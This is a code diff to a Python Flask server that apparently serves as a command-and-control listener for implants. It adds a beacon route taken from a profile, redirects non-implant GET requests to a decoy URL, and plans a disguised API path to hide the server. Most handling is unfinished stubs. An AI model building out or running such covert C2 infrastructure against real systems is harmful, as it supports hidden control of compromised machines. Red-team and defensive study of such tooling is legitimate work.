@@ -1,10 +1,15 @@
 import base64
+import json
 import logging
 import pymysql
 from core.config import *
 from gevent.wsgi import WSGIServer
-from flask import Flask
+from flask import Flask, request, redirect
 from logging.handlers import RotatingFileHandler
+
+# creates Flask app
+app = Flask(__name__)
+app.debug = True
 
 
 class WebServer(object):
@@ -15,6 +20,10 @@ class WebServer(object):
         self.external_address = args.external_address
         self.port = args.port
         self.profile = args.profile
+
+        # reads profile as a file
+        with open(self.profile) as file:
+            self.json_file = json.load(file)
 
         # tries to open the database connection
         try:
@@ -44,19 +53,44 @@ class WebServer(object):
         except Exception:
             return False
 
+    def beacon_response(self):
+        """
+        DESCRIPTION:
+            This function is called when an implant beacons
+
+        RETURNS:
+            String
+        """
+        # if request method is "GET"
+        # the implant will never use this method
+        # redirects client to the "redirect_url" specified in the profile
+        if request.method == "GET":
+            return redirect(self.json_file["implant"]["redirect_url"])
+
+        # else request method is "POST"
+        else:
+            # TO DO: do stuff here
+
+            return "beacon response"
+
     def start_web_server(self, port):
         """
         DESCRIPTION:
-            This function creates and starts the Flask web server
+            This function starts the Flask web server
 
         RETURNS:
             None
         """
-        # tries to create and start the Flask web server
+        # tries to start Flask web server
         try:
-            # creates Flask app
-            app = Flask(__name__)
-            app.debug = True
+            # adds beacon route
+            app.add_url_rule(self.json_file["implant"]["beacon_uri"], None, self.beacon_response, methods=["GET", "POST"])
+
+            # TO DO: add in update route here
+
+            # TO DO: add in "catch all" route
+            # this is needed so if a client does a GET to / instead of /api/v1/playlist/getFragment
+            # we will want to redirect the client to "redirect_url" in this case
 
             # configures Flask logging with 100 meg max file size
             # all requests are logged to "listener/logs/access.log"
@@ -74,7 +108,7 @@ class WebServer(object):
         except KeyboardInterrupt:
             pass
 
-        # exception raised creating and starting the Flask web server
+        # exception raised starting the Flask web server
         except Exception:
             raise
 
